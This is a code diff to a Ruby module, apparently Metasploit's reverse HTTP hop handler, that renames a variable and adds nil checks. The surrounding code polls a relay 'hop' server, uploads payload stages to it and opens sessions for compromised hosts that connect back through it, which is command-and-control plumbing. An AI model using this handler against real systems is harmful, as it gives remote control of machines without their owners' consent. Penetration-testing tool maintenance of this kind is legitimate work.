@@ -68,17 +68,18 @@ module ReverseHopHttp
     end
     @@hophandlers[full_uri] = self
     self.monitor_thread = Rex::ThreadFactory.spawn('ReverseHopHTTP', false, uri,
-        self) do |uri, hophttp|
+        self) do |uri, hop_http|
       control = "#{uri.request_uri}control"
-      hophttp.control = control
-      hophttp.send_new_stage(control) # send stage to hop
+      hop_http.control = control
+      hop_http.send_new_stage(control) # send stage to hop
       @finish = false
       delay = 1 # poll delay
-      until @finish and hophttp.handlers.empty?
+      until @finish and hop_http.handlers.empty?
         sleep delay
         delay = delay + 1 if delay < 10 # slow down if we're not getting anything
-        crequest = hophttp.mclient.request_raw({'method' => 'GET', 'uri' => control})
-        res = hophttp.mclient.send_recv(crequest) # send poll to the hop
+        crequest = hop_http.mclient.request_raw({'method' => 'GET', 'uri' => control})
+        res = hop_http.mclient.send_recv(crequest) # send poll to the hop
+        next if res == nil
         if res.error
           print_error(res.error)
           next
@@ -86,7 +87,7 @@ module ReverseHopHttp
 
         # validate response
         received = res.body
-        magic = hophttp.magic
+        magic = hop_http.magic
         next if received.length < 12 or received.slice!(0, magic.length) != magic
 
         # good response
@@ -95,17 +96,17 @@ module ReverseHopHttp
         urlpath = received.slice!(0,urlen)
 
         #received is now the binary contents of the message
-        if hophttp.handlers.include? urlpath
+        if hop_http.handlers.include? urlpath
           pack = Rex::Proto::Http::Packet.new
           pack.body = received
-          hophttp.current_url = urlpath
-          hophttp.handlers[urlpath].call(hophttp, pack)
+          hop_http.current_url = urlpath
+          hop_http.handlers[urlpath].call(hop_http, pack)
         else
           #New session!
           conn_id = urlpath.gsub("/","")
           # Short-circuit the payload's handle_connection processing for create_session
           # We are the dispatcher since we need to handle the comms to the hop
-          create_session(hophttp, {
+          create_session(hop_http, {
             :passive_dispatcher => self,
             :conn_id            => conn_id,
             :url                => uri.to_s + conn_id + "/\x00",
@@ -114,10 +115,10 @@ module ReverseHopHttp
             :ssl                => false,
           })
           # send new stage to hop so next inbound session will get a unique ID.
-          hophttp.send_new_stage(control)
+          hop_http.send_new_stage(control)
         end
       end
-      hophttp.monitor_thread = nil #make sure we're out
+      hop_http.monitor_thread = nil #make sure we're out
       @@hophandlers.delete(full_uri)
     end
   end
@@ -258,7 +259,7 @@ module ReverseHopHttp
     )
     res = self.mclient.send_recv(crequest)
     print_status("Uploaded stage to hop #{full_uri}")
-    print_error(res.error) if res.error
+    print_error(res.error) if res != nil and res.error
 
     #return conn info
     [conn_id, url]
